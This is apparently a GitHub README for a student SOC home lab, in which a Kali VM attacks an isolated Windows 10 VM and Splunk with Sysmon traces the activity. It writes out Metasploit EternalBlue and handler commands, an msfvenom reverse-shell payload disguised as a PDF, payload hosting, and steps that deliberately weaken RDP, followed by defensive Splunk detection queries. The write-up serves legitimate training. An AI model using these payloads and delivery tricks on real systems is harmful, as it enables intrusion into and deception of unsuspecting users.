# 👨‍💻SOC Home Lab: Using Splunk & Sysmon🚀  

## Table of Contents 
1. [Introduction](#introduction)
2. [Workflow Overview](#-workflow-overview)
3. [Prerequisites](#-prerequisites)
4. [Network Topology](#-network-topology)
5. [Step 1: Environment Setup](#️-step-1-environment-setup)
6. [Step 2: Network Configuration](#-step-2--network-configuration)
7. [Step 3: Initial Network Scanning](#-step-3--initial-network-scanning-)
8. [Step 4: Scanning & Attempted SMB Exploitation](#step-4-scanning-attempted-smb-exploitation)
9. [Step 5: Creating an RDP Vulnerability](#-step-5-creating-an-rdp-vulnerability-)
10. [Step 6: Payload Creation & Listener Setup](#-step-6--payload-delivery-&-exploitation-attempt)
11. [Step 7: Payload Delivery & Reverse Shell](#️-step-7--payload-delivery-&-reverse-shell-gained)
12. [Step 8: Splunk Analysis of Malware Execution](#-step-8-splunk-analysis-of-malware-execution-)
13. [Step 9: Step 9: Created a Dashboard for Better Understanding](#-step-9-created-a-dashboard-for-better-understanding-)
13. [Step 10: Correlating Reverse Shell Activity with Splunk Logs](#-step-9-correlating-reverse-shell-activity-with-splunk-logs-)
14. [Next Steps & Future Enhancements](#-next-steps--future-enhancements)
15. [Conclusion](#-conclusion)
16. [Let’s Connect](#-lets-connect)


---  
## 📌Introduction
This project demonstrates the creation of a Security Operations Center Home (SOC Home) Lab Environment for practicing cybersecurity attacks and monitoring. The lab simulates a realistic attack–defense scenario within an isolated network.  

The setup includes:  
💻 Windows 10 Virtual Machine – The target machine  
🐉 Kali Linux Virtual Machine – The attacker machine  
📊 Splunk – Security Information and Event Management (SIEM) tool for log aggregation and monitoring  
📜 Sysmon – A system monitoring tool for detailed Windows event logging  

🌐 Network Setup  
Internal Network / LAN Segment – No internet connection, ensuring a safe and isolated testing environment  
Both VMs communicate only within the isolated network  

---  

## 🔍 Workflow Overview

⚙️ Setup & Configuration :   
  💻 Install & configure Splunk on Windows 10  
  🛡️ Install Sysmon to capture detailed security logs  

🎯 Attack Simulation :   
  🐧 Use Kali Linux & Metasploit to exploit vulnerabilities in the Windows 10 VM  
  🔓 Test both SMB-based attacks and RDP exploitation  

📊 Monitoring & Detection :   
  👀 Observe attack traces in Splunk dashboards  
  📜 Analyze Sysmon logs for Indicators of Compromise (IoCs)  

---  

🛠 Key Highlights  
  Simulates real-world attack scenarios in a safe, isolated lab  
  Demonstrates how SOC teams detect, analyze, and respond to threats  
  Covers SMB brute-force login attempts and RDP exploitation scenarios  

---  


## 🔧 Prerequisites  

| Requirement               | Description                                                                   |  
| ------------------------- | ----------------------------------------------------------------------------- |  
| **Hypervisor**            | VMware Workstation / VirtualBox (for creating and managing virtual machines)  |  
| **Target Machine**        | **Windows 10 VM** – 5–6 GB RAM, 2 CPU cores, Internal Network (LAN Segment)   |  
| **Attacker Machine**      | **Kali Linux VM** – 4 GB RAM, 2 CPU cores, Internal Network (LAN Segment)     |  
| **Operating System ISOs** | Windows 10 ISO & Kali Linux ISO                                               |  
| **Logging Tools**         | Splunk (SIEM) and Sysmon (Windows logging agent) installation files           |  
| **Internet Connection**   | Only required initially for downloading Splunk, Sysmon, and necessary updates |  
| **Storage**               | Sufficient disk space for two VMs and log data                                |  


---  

## 🌐 Network Topology
Below is the network topology of the SOC Home lab environment:  
<img width="577" height="199" alt="diagram-export-8-9-2025-8_06_10-PM" src="https://github.com/user-attachments/assets/d9492b0a-4bf7-4905-81f1-693fed0037de" />

---  

## 🛠️ Step 1: Environment Setup
  Install Kali Linux (Attacker) via Kali ISO → Update & upgrade system.  
  Install Windows 10 (Target) via Windows ISO → Enable networking for VM communication.  
  Install Splunk on Windows from Splunk → Enable log collection.  
  Install Sysmon from Sysinternals using sysmonconfig.xml → Verify it’s running.  

---  

## 🌐 Step 2: 🛠 Network Configuration
🔌 Set VM network adapter → LAN Segment for isolated lab setup.  
📍 Assigned static IPs:  
    🖥 Windows 10 VM → 192.168.56.2  
    💻 Kali Linux VM → 192.168.56.3  
📡 Ensured both VMs can communicate within the lab.  
<p align="center">
  <img height="199" src="https://github.com/user-attachments/assets/9fc60ddf-2b1a-401c-944f-ef5b1a22fe34" alt="LAN Segment & IP settings" width="250" />
  <img height="199" src="https://github.com/user-attachments/assets/84137f91-8150-43e8-bb99-42413128a7e5" alt="VMware Settings" width="250" />
</p>

---  

## 🌐 Step 3: 🛠 Initial Network Scanning
📤 From Kali Linux, sent ping scan → ❌ blocked by Windows Defender Firewall.  
🛰 Ran Nmap scan → 🔒 all ports filtered.  
🔄 From Windows 10, pinged Kali Linux → ✅ success.  
🛑 Disabled Public Network Firewall on Windows 10 for testing.  
<p align="center">
  <img src="https://github.com/user-attachments/assets/d93f2312-79db-422d-87ed-d5c849d9a072" alt="LAN Segment & IP settings"  height="250" />
  <img src="https://github.com/user-attachments/assets/0e096288-b68f-4d9e-8d54-3dc371355a36" alt="VMware Settings"  height="250" />
</p>

---  

## ⚡ Step 4: 🎯 Scanning & Attempted SMB Exploitation
📡 Nmap scan after disabling firewall revealed open ports:  
    135 🛠 RPC  
    445 📂 SMB  
    8000 📊 Splunk Web Interface  
    8089 🔑 Splunk Management Port  
🔍 Targeted SMB protocol (Port 445) for exploitation.  
💣 Attempted EternalBlue (MS17-010) using Metasploit:  

    use exploit/windows/smb/ms17_010_eternalblue  
    set RHOSTS 192.168.56.2  
    set PAYLOAD windows/x64/meterpreter/reverse_tcp  
    set LHOST 192.168.56.3  
    set LPORT 4444  
    exploit  

❌ Result: No luck — Windows 10 machine was patched 🛡 and immune to the exploit.  

<p align="center">
  <img src="https://github.com/user-attachments/assets/e238f7e1-fc89-4282-b2b3-490cb38e6e00" alt="LAN Segment & IP settings" width="250" height="199" />
</p>
 
---  

## 🔄 Step 5: Creating an RDP Vulnerability 💻🔓  
Since SMB was a dead end, I decided to create my own vulnerability by enabling Remote Desktop Protocol (RDP, Port 3389) and intentionally misconfiguring it.  

🛠 Steps Taken:  
  Enabled Remote Desktop from the system settings.  
  Nmap scan still showed RDP as closed 🚫.  
  🗝 Registry Tweak:  
    Opened regedit → navigated to:  

    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server 

  Changed fDenyTSConnections value to 0 ✅ (enabled RDP directly from registry, bypassing GUI).  

🔄 Service Management:  
  Located TermService (Remote Desktop Services).  
  Stopped → Started → Restarted multiple times to ensure activation.  
  ⚙ Group Policy Configuration (gpedit.msc):  
      Enabled Allow users to connect remotely under:  

    Computer Configuration → Administrative Templates → Windows Components → Remote Desktop Services → Remote Desktop Session Host → Connections  

  Ensured Network Level Authentication was disabled to reduce restrictions.  

📊 Final Check:  
    Ran Nmap again → ✅ Port 3389 OPEN 🎉  
    Ready for RDP exploitation in the next step!  
 
<p align="center">
  <img src="https://github.com/user-attachments/assets/9c3f884c-812c-4c11-9659-1e4f9a9926ed" alt="LAN Segment & IP settings" width="250" height="199"/>
  <img src="https://github.com/user-attachments/assets/d57030d2-f85d-49b7-a4a0-fbea9f53cac1" alt="VMware Settings" width="250" height="199"/>
  <img src="https://github.com/user-attachments/assets/697bc3cc-0083-41f9-9a5e-e5334e51d28d" alt="VMware Settings" width="250" height="199"/>
</p>

---  


## 🚀 Step 6: 🎯 Payload Delivery & Exploitation Attempt
  With RDP (3389) now open 🔓, I moved on to creating and delivering a malicious payload for exploitation.  
  🛠 Payload Creation (MSFvenom)  

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.3 LPORT=4444 -f exe -o ProjectReport.pdf.exe  

💡 Payload: Windows Meterpreter Reverse TCP  
📍 LHOST: Attacker machine IP  
📍 LPORT: Listener port for reverse shell  

📡 Setting Up the Listener (Metasploit)  

    msfconsole  
    use exploit/multi/handler  
    set PAYLOAD windows/meterpreter/reverse_tcp  
    set LHOST 192.168.56.3  
    set LPORT 4444  
    exploit  
🎯 Waiting for the target to execute the payload...  

🌐 Hosting Payload with Python  
To easily transfer the file to the target, I started a Python HTTP server:  

    python3 -m http.server 9999  

📂 Payload hosted at:  

    http://192.168.56.3:9999/ProjectReport.pdf.exe  
📸 Result:  
    Payload successfully hosted & accessible ✅  
R    eady for delivery to target 🎯 (execution attempt covered in the next step)   

<p align="center">
  <img src="https://github.com/user-attachments/assets/3e75489f-aa7b-4aa8-abca-54ea410ca2d7" alt="LAN Segment & IP settings" width="250" height="199"/>
  <img src="https://github.com/user-attachments/assets/b384ec69-3a8b-4c68-9cf5-a01ae3a25b9f" alt="VMware Settings" width="250" height="199"/>
  <img src="https://github.com/user-attachments/assets/2d1547f3-8caa-4233-88ec-084f942687f1" alt="VMware Settings" width="250" height="199"/>
</p>

---  

## 🖥️ Step 7: 🎯 Payload Delivery & Reverse Shell Gained
  💻 On Target (Windows 10):  
    1️⃣ Opened browser → http://192.168.56.3:9999 🌐  
    2️⃣ Downloaded projectreport.pdf 📄 (actually projectreport.pdf.exe 🐍 — .exe hidden)  
    3️⃣ ⚠️ Chrome Warning: “File contains malware” — Ignored & kept file  
    4️⃣ ⚠️ Windows Defender Alert: “File may be harmful” — Chose to run anyway 🛑  

  💥 Execution & Shell Access  
  Upon execution, reverse TCP connection established 🔗  
  Meterpreter session opened on Kali 🎉  

  🔍 Post-Exploitation Actions  
  Inside Meterpreter:  

      ls  
      shell  
      ipconfig  
      ipconfig /all  
      net localgroup  
      net user  

  📌 Gathered network info, checked user accounts, and enumerated privileges 👀  

<p align="center">
  <img src="https://github.com/user-attachments/assets/ca0e12ba-a017-4a4f-9d0b-b420e156b3ca" alt="LAN Segment & IP settings" width="250" height="199"/>
  <img src="https://github.com/user-attachments/assets/9a5db2c0-4e8e-431e-9fb3-7a66d3c37968" alt="VMware Settings" width="250" height="199"/>
  <img src="https://github.com/user-attachments/assets/0eaa2f31-45c5-4fe3-afab-6fe42176bf5a" alt="VMware Settings" width="250" height="199"/>
</p>

---  

## 📊 Step 8: Splunk Analysis of Malware Execution 🕵️‍♂️
  💡 Objective: Track malware activity (projectreport.pdf.exe) using Splunk Search & Reporting.  
  🛠️ Actions Performed  
  1️⃣ Opened Splunk → Search & Reporting App 📈  
  2️⃣ Ran initial search:  

      index=endpoint  
  🔍 (endpoint was the index created earlier to store endpoint logs — including Sysmon data)  
  3️⃣ Located multiple logs for system activities.  
  4️⃣ Focused search to find malware traces:  
<p align="center">
  <img src="https://github.com/user-attachments/assets/03c42cf9-6fd0-40eb-a969-849e7c6e6a43" alt="LAN Segment & IP settings" width="350" height="250"/>
</p>

    index=endpoint "projectreport.pdf.exe"  
  📌 Found several logs related to the file execution.  
  5️⃣ Opened a specific log → copied Process GUID 🆔  
  6️⃣ Queried again with the GUID:  
  
      index=endpoint "<Process_GUID>"  
  📊 Retrieved detailed logs of the malware process lifecycle.  
  7️⃣ Refined output with table formatting for clarity:  

    index=endpoint "<Process_GUID>"  | table _time, parent_process, image, command_line  

  🖥️ Columns included:  
    _time ⏱️ — Timestamp of event  
    parent_process 🏗️ — Process that spawned this activity  
    image 🖼️ — Executable file path  
    command_line 💻 — Full execution command  

<p align="center">
  <img src="https://github.com/user-attachments/assets/69f2784d-7fe3-4a02-aacd-1a3a98ba3655" alt="LAN Segment & IP settings" width="350" height="250"/>
</p>

📌 Result :   
    ✅ Successfully correlated malware file execution with process hierarchy and timeline.  
    ✅ Identified parent process, child process, full path, and execution command for forensic reporting.  

---  

## 🛠️ Step 9: Created a Dashboard for Better Understanding
Designed and implemented a comprehensive Splunk dashboard to visualize key security metrics and events. This dashboard includes charts for top source IPs, destination ports, user logons, process executions, suspicious parent-child process relationships, reverse shell indicators, registry key changes, and detailed endpoint logs. It helps in monitoring and quickly identifying potential security incidents during the SOC lab exercises.

<img width="1904" height="500" alt="Dashboard_graphs" src="https://github.com/user-attachments/assets/555803d1-8449-4495-9118-12fb5ab0ae54" />


---  

## 🔍 Step 10: Correlating Reverse Shell Activity with Splunk Logs 🖥️💣
💡 Objective: Map the attacker’s actions (Meterpreter session) to endpoint telemetry collected by Splunk for full visibility.  

🛠️ Actions Performed  
1️⃣ From Step 7, we had a Meterpreter session opened after executing projectreport.pdf.exe.  
2️⃣ We already had the Process GUID for the malware execution from Step 8.  
This GUID was used as the pivot point to find related activity.  
3️⃣ Ran a broader search in Splunk to catch all processes spawned after the malware execution:  

    index=endpoint "<Process_GUID>" OR parent_process="<Malware_Process_Path>"  
📌 This helped reveal not only the malware process but also child processes triggered by it.  

4️⃣ Looked specifically for commands that matched the attacker’s actions:  
ipconfig, net user, net localgroup 🧾  
These would appear in logs as part of cmd.exe or powershell.exe executions.  
5️⃣ Refined query for command-line activities:  

    index=endpoint ("ipconfig" OR "net user" OR "net localgroup") | table _time, parent_process, image, command_line  

💡 This showed:  
Timestamps matching when commands were run in Meterpreter shell.  
Parent process as cmd.exe launched by the malware.  
6️⃣ Cross-checked the timeline of these events with the reverse shell timestamps in Kali Linux MSF console to validate correlation ✅.  

📌 Result  
✅ Successfully confirmed that the attacker’s shell commands directly originated from the malware execution process.  
✅ Created a full forensic chain:  
File Download → Execution → Reverse Shell → Commands → Detection in Splunk 🔄  

---  

## 🚀 Next Steps & Future Enhancements  
🔍 Option 1: Deploy ELK Stack for deeper, faster, and more flexible log analysis — fully customized for your environment.  
🛡️ Option 2: Deploy Wazuh SIEM (built on ELK) for advanced threat detection, automated correlation rules, and ready-made SOC dashboards.  
🐍 Use Python automation scripts to streamline the attack workflow.  
📟 Build a more advanced SOC dashboard that triggers real-time alerts when suspicious signatures, malware patterns, or specific attack indicators are detected — allowing analysts to respond instantly.  

---  

## 🏁 Conclusion  
Through this project, we were able to:  
🏗️ Build a fully functional cybersecurity home lab  
💣 Simulate & analyze malware-based attacks  
📊 Leverage Splunk for effective threat detection and incident investigation  
⚠️ Disclaimer: This work is strictly for educational purposes. Any unauthorized use of these methods is illegal and unethical.  

---  

## 📌 Let’s Connect  
💼 [LinkedIn](https://www.linkedin.com/in/pranavkale1124/)  
🖥️ [GitHub](https://github.com/Pranav-Kale)  
